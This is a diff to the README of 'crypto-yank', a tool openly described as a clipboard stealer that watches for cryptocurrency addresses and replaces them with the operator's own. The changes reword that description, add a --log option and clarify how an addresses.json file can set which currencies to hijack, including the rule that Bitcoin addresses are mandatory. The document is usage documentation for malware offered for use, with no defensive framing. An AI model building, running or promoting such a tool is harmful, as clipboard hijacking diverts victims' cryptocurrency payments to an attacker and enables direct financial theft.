@@ -12,7 +12,9 @@
 
 ### About:
 
-**crypto-yank** is a clipboard stealer that monitors the clipboard for crypto addresses and replaces it with your own. If no address is found in the clipboard crypto-yank does nothing and remains waiting for a valid address to replace.
+**crypto-yank** is a clipboard stealer that monitors for crypto addresses and replaces them with your own. If no address is found crypto-yank remains dormant until it finds a valid address.
+
+crypto-yank is comprised of regex to find and match addresses.
 
 ### Usage:
 
@@ -27,6 +29,7 @@ python3 crypto-yank.py
 
 ```
 --verbose 
+--log (Logs output to a txt file named log.txt)
 ```
 
 If you don't want to use the setup script you can provide your own `addresses.json` in the following format.
@@ -58,10 +61,9 @@ You can also provide the key `"NULL"` to specific cryptos if you wish not to mon
     "doge": "doge_ad"
 }
 ```
-Placing the string  `"NULL"` for xmr would now ignore that crypto currency.
+Placing the string  `"NULL"` for xmr would now ignore replacing that crypto currency.
 
-##### NOTE: 
-Bitcoin addresses are mandatory including (segwit and legacy).
+##### *NOTE: Bitcoin addresses are mandatory including (segwit and legacy).
 
 Once this file is created in the same directory as `crypto-yank.py` you can run `crypto-yank.py` to start monitoring.
 
